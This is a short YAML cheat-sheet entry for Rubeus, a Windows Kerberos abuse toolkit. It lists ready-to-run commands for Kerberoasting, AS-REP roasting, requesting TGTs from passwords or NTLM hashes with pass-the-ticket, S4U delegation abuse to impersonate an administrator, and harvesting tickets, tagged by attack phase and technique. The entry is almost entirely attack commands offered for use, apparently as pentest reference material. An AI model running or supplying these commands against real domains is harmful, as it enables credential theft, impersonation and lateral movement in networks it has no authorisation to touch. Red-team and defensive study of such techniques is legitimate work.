---
description: |
  C# Kerberos abuse toolkit. Kerberoast, AS-REP roast, ticket
  requests, and delegation attacks from Windows.
command: |
  # Kerberoasting
  .\Rubeus.exe kerberoast /outfile:hashes.txt

  # AS-REP Roasting
  .\Rubeus.exe asreproast /outfile:asrep.txt

  # Request TGT with password
  .\Rubeus.exe asktgt /user:john /password:password123 /ptt

  # Request TGT with hash
  .\Rubeus.exe asktgt /user:john /rc4:HASH /ptt

  # S4U delegation abuse
  .\Rubeus.exe s4u /user:MACHINE$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.test.local /ptt

  # Monitor for new TGTs
  .\Rubeus.exe monitor /interval:5

  # Harvest all tickets
  .\Rubeus.exe harvest /interval:30
phase:
  - Exploitation
  - Post-Exploitation
target_os:
  - Windows
services:
  - Kerberos
items:
  - Shell
  - Username
  - Password
  - Hash
techniques:
  - Kerberoasting
  - AS-REP_Roasting
  - Delegation_Abuse
  - Pass-the-Hash_Ticket
network_position:
  - Local
  - Internal
references:
  - https://github.com/GhostPack/Rubeus
---
